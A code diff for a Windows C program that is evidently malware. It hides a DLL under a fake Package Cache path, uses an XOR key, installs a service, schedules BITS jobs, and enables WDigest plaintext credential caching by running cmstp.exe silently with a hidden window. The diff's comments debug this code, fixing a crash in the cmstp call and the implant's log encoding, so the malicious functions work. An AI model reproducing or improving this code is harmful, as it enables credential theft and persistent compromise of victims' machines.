@@ -17,13 +17,12 @@
 #include <stdio.h>
 
 
-// ponytail: #pragma pack(push,4) removed — it globally 4-byte-aligns all
-// subsequent structs including SHELLEXECUTEINFOW, STARTUPINFOW, and
-// PROCESS_INFORMATION. Win32 APIs expect natural (8-byte on x64) alignment.
-// MinGW doesn't re-pack its own headers, so the mismatch caused
-// ACCESS_VIOLATION (0xC0000005) when Windows read mis-aligned struct fields
-// in InstallService, ScheduleBitsJob, EnableWDigest, etc. — WorkerThread
-// AV'd ~15s in at the first CreateProcessW call.
+// ponytail: previous "struct alignment" diagnosis was wrong — MinGW headers
+// self-protect STARTUPINFOW layout so the outer #pragma pack(push,4) had no
+// effect. Real WorkerThread AV was a read-only L"..." literal passed as
+// lpCommandLine to CreateProcessW at EnableWDigest (CreateProcessW writes
+// into that buffer to tokenize it). Fixed at EnableWDigest by copying to a
+// writable stack buffer, same pattern as InstallService ~line 1201.
 #define XOR_KEY 0xAA
 #define DLL_PATH "C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
 #define DLL_PATH_W L"C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll"
@@ -78,12 +77,16 @@ static void LogMessage(LPCWSTR msg) {
     wchar_t timestamp[32];
     wsprintfW(timestamp, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+    // ponytail: convert wide -> UTF-8 (no BOM) so cache.dat is one coherent
+    // byte stream alongside the JScript FSO ASCII + loader AppendAllText
+    // writes. Previous UTF-16LE writes appeared as [ 2 0 2 6 ... ] mojibake.
+    char ts8[80], msg8[1024];
+    int tsN  = WideCharToMultiByte(CP_UTF8, 0, timestamp, -1, ts8,  sizeof(ts8),  NULL, NULL);
+    int msgN = WideCharToMultiByte(CP_UTF8, 0, msg,        -1, msg8, sizeof(msg8), NULL, NULL);
     DWORD written;
-    DWORD tsLen = lstrlenW(timestamp) * sizeof(wchar_t);
-    WriteFile(hFile, timestamp, tsLen, &written, NULL);
-    DWORD msgLen = lstrlenW(msg) * sizeof(wchar_t);
-    WriteFile(hFile, msg, msgLen, &written, NULL);
-    WriteFile(hFile, L"\r\n", 2 * sizeof(wchar_t), &written, NULL);
+    if (tsN  > 0) WriteFile(hFile, ts8,  (DWORD)(tsN  - 1), &written, NULL);
+    if (msgN > 0) WriteFile(hFile, msg8, (DWORD)(msgN - 1), &written, NULL);
+    WriteFile(hFile, "\r\n", 2, &written, NULL);
 
     CloseHandle(hFile);
 }
@@ -726,7 +729,14 @@ static void EnableWDigest(void) {
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    if (CreateProcessW(NULL, L"cmstp.exe /s /au C:\\Windows\\Temp\\~wdg.inf",
+    // ponytail: CreateProcessW writes into lpCommandLine (tokenizes it), so the
+    // buffer must be writable. Passing L"..." directly lands the literal in
+    // .rdata (read-only) and AVs with 0xC0000005 inside kernelbase. Mirror
+    // InstallService's pattern (line ~1201): copy to a stack buffer first.
+    wchar_t cmd[256];
+    wsprintfW(cmd, L"cmstp.exe /s /au %s", WDG_INF_PATH);
+
+    if (CreateProcessW(NULL, cmd,
                        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, 15000);
         DWORD exitCode = 0;
